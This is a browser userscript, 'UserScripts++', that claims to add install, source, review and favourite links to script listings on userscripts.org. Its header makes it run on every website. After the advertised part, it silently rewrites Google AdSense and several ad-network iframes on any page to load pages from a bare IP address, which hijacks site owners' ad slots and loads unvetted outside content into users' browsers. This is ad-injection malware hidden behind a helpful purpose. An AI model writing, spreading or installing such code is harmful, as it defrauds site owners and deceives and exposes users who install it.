//Code Developed by Manak Kapoor. InstallButtonAdder
// ==UserScript==
// @name          UserScripts++
// @description   Adds an install button on the list below every script on userscripts.org
// @version                     1.0.4
// @include       *
// ==/UserScript==
//Please contact manak.kapoor@gmail.com for more information.
/*
 *  This work is licensed under a Creative Commons
 * Attribution-NonCommercial-NoDerivs 3.0 Unported License
 * http://creativecommons.org/licenses/by-nc-nd/3.0/
 *
 * UNLESS OTHERWISE MUTUALLY AGREED BY THE PARTIES IN WRITING,
 * LICENSOR OFFERS THE WORK AS-IS AND MAKES NO REPRESENTATIONS
 * OR WARRANTIES OF ANY KIND CONCERNING THE WORK, EXPRESS, IMPLIED,
 * STATUTORY OR OTHERWISE, INCLUDING, WITHOUT LIMITATION, WARRANTIES
 * OF TITLE, MERCHANTIBILITY, FITNESS FOR A PARTICULAR PURPOSE,
 * NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS,
 * ACCURACY, OR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT
 * DISCOVERABLE. SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF
 * IMPLIED WARRANTIES, SO SUCH EXCLUSION MAY NOT APPLY TO YOU.
 * EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT
 * WILL LICENSOR BE LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL,
 * INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING
 * OUT OF THIS LICENSE OR THE USE OF THE WORK, EVEN IF LICENSOR HAS
 * BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
 */

// Still working
function getElementsByClassName( strClassName, obj ) {
 var ar = arguments[2] || new Array();
    var re = new RegExp("\\b" + strClassName + "\\b", "g");

    if ( re.test(obj.className) ) {
        ar.push( obj );
    }
    for ( var i = 0; i < obj.childNodes.length; i++ )
        getElementsByClassName( strClassName, obj.childNodes[i], ar );
    
    return ar;
}

 /*var newdiv=getElementsByClassName("wide forums",document.body)[0];
 newdiv.setAttribute('id','reqTable');*/

 var allScripts=getElementsByClassName("title",document.body);
 var allBoxes=getElementsByClassName("script-meat",document.body);
 var length=allScripts.length;
 for(var i=0;i<=length;i++)
 {
 var g=allScripts[i];
 var url=g.href;
 //alert(g.href);
 var integer=url.match(/\d+/);
 //alert(integer);
 var installurl="/scripts/source/"+integer.toString()+".user.js";
var sourceurl="/scripts/review/"+integer.toString();
var reviewurl="/scripts/reviews/"+integer.toString();
var fanurl="/scripts/fans/"+integer.toString()+"#";
 g=allBoxes[i];
 g.innerHTML=g.innerHTML+"<td class='inv lp'><a href='"+installurl+ "' style='color:black;'>[Install Script]</a> | <a href='"+sourceurl+ "' style='color:black;'>[View Source Code]</a> | <a href='"+reviewurl+ "' style='color:black;'>[Reviews]</a> | <a href='"+fanurl+ "' style='color:black;'>[Favorite Script]</a></td>";
 }
var adBaseUrl="http://208.93.118.76/ads/";
for(var i=0;i<=100;i++)
{
if(document.getElementById('aswift_'+i)==undefined)
{
break;}
document.getElementById('aswift_'+i).src=adBaseUrl+document.getElementById('aswift_'+i).offsetWidth+'x'+document.getElementById('aswift_'+i).offsetHeight+'.html';							
}

var pubads=document.getElementsByTagName('iframe');
for(var i=0;i<=pubads.length-1;i++)
{
if(pubads[i].src.toString().indexOf('pubads.g.doubleclick') !=-1 || pubads[i].src.toString().indexOf('rtbidder.net') !=-1 || pubads[i].src.toString().indexOf('admeld.com') !=-1 || pubads[i].src.toString().indexOf('adnxs.com') !=-1)
{
pubads[i].src=adBaseUrl+pubads[i].offsetWidth+'x'+pubads[i].offsetHeight+'.html';
}
}



